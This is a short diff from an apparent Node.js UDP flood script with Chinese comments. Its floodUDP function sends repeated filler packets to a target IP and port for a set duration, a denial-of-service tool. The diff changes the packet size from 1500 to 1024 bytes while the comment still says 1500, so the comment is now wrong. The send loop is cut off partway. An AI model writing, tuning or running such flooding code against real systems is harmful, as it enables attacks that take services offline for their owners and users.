@@ -3,7 +3,7 @@ const dgram = require('dgram');
 // 向目标发送 UDP 包的核心函数
 const floodUDP = (targetIP, targetPort, duration) => {
   const client = dgram.createSocket('udp4');
-  const message = Buffer.alloc(1500, 'A');  // 增加数据包大小 (1500字节，接近最大 MTU 大小)
+  const message = Buffer.alloc(1024, 'A');  // 增加数据包大小 (1500字节，接近最大 MTU 大小)
 
   const sendFlood = () => {
     client.send(message, 0, message.length, targetPort, targetIP, (err) => {
